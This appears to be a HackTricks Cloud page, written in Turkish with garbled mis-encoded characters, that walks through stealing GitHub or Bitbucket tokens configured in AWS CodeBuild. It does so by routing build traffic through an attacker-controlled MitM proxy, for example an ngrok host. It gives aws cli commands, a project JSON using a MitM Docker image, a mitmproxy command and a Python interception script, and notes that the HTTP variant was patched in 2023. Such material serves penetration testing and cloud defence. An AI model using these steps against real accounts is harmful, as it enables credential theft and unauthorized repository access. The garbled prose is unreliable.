# AWS Codebuild - Token SÄ±zÄ±ntÄ±sÄ±

<details>

<summary><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)'Ä± **takip edin**.
* Hacking hilelerinizi [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶ndererek paylaÅŸÄ±n.

</details>

## Github/Bitbucket YapÄ±landÄ±rÄ±lmÄ±ÅŸ TokenlarÄ± Kurtarma

Ä°lk olarak, sÄ±zdÄ±rabileceÄŸiniz herhangi bir kaynak kimlik bilgisi yapÄ±landÄ±rÄ±lÄ±p yapÄ±landÄ±rÄ±lmadÄ±ÄŸÄ±nÄ± kontrol edin:
```bash
aws codebuild list-source-credentials
```
### Docker Ä°majÄ± AracÄ±lÄ±ÄŸÄ±yla

EÄŸer Ã¶rneÄŸin Github iÃ§in kimlik doÄŸrulamanÄ±n hesapta ayarlandÄ±ÄŸÄ±nÄ± bulursanÄ±z, projenin derlemesini Ã§alÄ±ÅŸtÄ±rmak iÃ§in Codebuild'in belirli bir docker imajÄ±nÄ± kullanarak bu eriÅŸimi (GH token veya OAuth token) **dÄ±ÅŸarÄ±ya Ã§Ä±karabilirsiniz**.

Bu amaÃ§la, yeni bir Codebuild projesi oluÅŸturabilir veya mevcut bir projenin **ortamÄ±nÄ± deÄŸiÅŸtirerek Docker imajÄ±nÄ± ayarlayabilirsiniz**.

KullanabileceÄŸiniz Docker imajÄ± [https://github.com/carlospolop/docker-mitm](https://github.com/carlospolop/docker-mitm) adresinde bulunmaktadÄ±r. Bu Ã§ok temel bir Docker imajÄ±dÄ±r ve **`https_proxy`**, **`http_proxy`** ve **`SSL_CERT_FILE`** ortam deÄŸiÅŸkenlerini ayarlar. Bu, **`https_proxy`** ve **`http_proxy`** ile belirtilen ana bilgisayarÄ±n Ã§oÄŸu trafiÄŸini aramanÄ±za ve **`SSL_CERT_FILE`** ile belirtilen SSL SERT'ine gÃ¼venmenize olanak saÄŸlar.

1. **Kendi Docker MitM imajÄ±nÄ±zÄ± oluÅŸturun ve yÃ¼kleyin**
* Ä°pucu deposunun talimatlarÄ±nÄ± izleyerek proxy IP adresinizi ayarlayÄ±n ve SSL sertifikanÄ±zÄ± ayarlayÄ±n ve **docker imajÄ±nÄ± oluÅŸturun**.
* Metadata uÃ§ noktasÄ±na yapÄ±lan istekleri aramamak iÃ§in **`http_proxy`** ayarlamayÄ±n.
* Proxy'yi kendi ana bilgisayarÄ±nÄ±za ayarlamak iÃ§in `ngrok tcp 4444` gibi **`ngrok`** kullanabilirsiniz.
* Docker imajÄ±nÄ±zÄ± oluÅŸturduktan sonra, **genel bir depoya** (Dockerhub, ECR...) yÃ¼kleyin.
2. **OrtamÄ± ayarlayÄ±n**
* Yeni bir Codebuild projesi oluÅŸturun veya mevcut bir projenin ortamÄ±nÄ± **deÄŸiÅŸtirin**.
* Projeyi, **Ã¶nceden oluÅŸturulan Docker imajÄ±nÄ±** kullanacak ÅŸekilde ayarlayÄ±n.

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

3. **Ana bilgisayarÄ±nÄ±zda MitM proxy'sini ayarlayÄ±n**

* Github deposunda belirtildiÄŸi gibi, ÅŸuna benzer bir ÅŸey kullanabilirsiniz:
```bash
mitmproxy --listen-port 4444  --allow-hosts "github.com"
```
{% hint style="success" %}
KullanÄ±lan **mitmproxy sÃ¼rÃ¼mÃ¼ 9.0.1** idi, sÃ¼rÃ¼m 10 ile bu iÅŸe yaramayabileceÄŸi bildirildi.
{% endhint %}

4. **Derlemeyi Ã§alÄ±ÅŸtÄ±rÄ±n ve kimlik bilgilerini yakalayÄ±n**

*   Kimlik bilgilerini **Authorization** baÅŸlÄ±ÄŸÄ±nda gÃ¶rebilirsiniz:

<figure><img src="../../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

Bu ayrÄ±ca aws cli ile ÅŸu ÅŸekilde de yapÄ±labilir

{% code overflow="wrap" %}
```bash
# Create project using a Github connection
aws codebuild create-project --cli-input-json file:///tmp/buildspec.json

## With /tmp/buildspec.json
{
"name": "my-demo-project",
"source": {
"type": "GITHUB",
"location": "https://github.com/uname/repo",
"buildspec": "buildspec.yml"
},
"artifacts": {
"type": "NO_ARTIFACTS"
},
"environment": {
"type": "LINUX_CONTAINER", // Use "ARM_CONTAINER" to run docker-mitm ARM
"image": "docker.io/carlospolop/docker-mitm:v12",
"computeType": "BUILD_GENERAL1_SMALL",
"imagePullCredentialsType": "CODEBUILD"
}
}

## Json

# Start the build
aws codebuild start-build --project-name my-project2
```
{% endcode %}

### ~~HTTP protokolÃ¼ aracÄ±lÄ±ÄŸÄ±yla~~

{% hint style="success" %}
**Bu zafiyet, AWS tarafÄ±ndan 20 Åubat 2023 haftasÄ±nda (sanÄ±rÄ±m Cuma gÃ¼nÃ¼) dÃ¼zeltildi. Bu nedenle saldÄ±rgan artÄ±k bunu istismar edemez :)**
{% endhint %}

**CodeBuild Ã¼zerinde yÃ¼kseltilmiÅŸ izinlere sahip bir saldÄ±rgan, yapÄ±landÄ±rÄ±lmÄ±ÅŸ Github/Bitbucket belirteci** veya izinler OAuth aracÄ±lÄ±ÄŸÄ±yla yapÄ±landÄ±rÄ±ldÄ±ysa, **kod eriÅŸimi iÃ§in kullanÄ±lan geÃ§ici OAuth belirteci** sÄ±zdÄ±rabilir.

* Bir saldÄ±rgan, CodeBuild projesine kendi makinesine iÅŸaret eden **http\_proxy** ve **https\_proxy** Ã§evresel deÄŸiÅŸkenlerini ekleyebilir (Ã¶rneÄŸin `http://5.tcp.eu.ngrok.io:14972`).

<figure><img src="../../../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* ArdÄ±ndan, github deposunun URL'sini HTTPS yerine HTTP kullanacak ÅŸekilde deÄŸiÅŸtirin, Ã¶rneÄŸin: \*\*http://\*\*github.com/carlospolop-forks/TestActions
* ArdÄ±ndan, proxy deÄŸiÅŸkenleri (http\_proxy ve https\_proxy) tarafÄ±ndan iÅŸaretlenen baÄŸlantÄ± noktasÄ±nda [https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm) adresindeki temel Ã¶rneÄŸi Ã§alÄ±ÅŸtÄ±rÄ±n.
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="127.0.0.1",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
* Son olarak, **Proje oluÅŸtur** Ã¼zerine tÄ±klayÄ±n, **kimlik bilgileri** aÃ§Ä±k metin olarak (base64) mitm baÄŸlantÄ± noktasÄ±na gÃ¶nderilecektir:

<figure><img src="../../../../.gitbook/assets/image (1) (1) (6).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Åimdi bir saldÄ±rgan, token'Ä± kendi makinesinden kullanabilecek, sahip olduÄŸu tÃ¼m ayrÄ±calÄ±klarÄ± listeleyebilecek ve CodeBuild hizmetini doÄŸrudan kullanmaktan daha kolay bir ÅŸekilde (kÃ¶tÃ¼ye) kullanabilecektir.
{% endhint %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahramana kadar AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya HackTricks'i **PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya bizi **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'da takip edin.**
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek** paylaÅŸÄ±n.

</details>
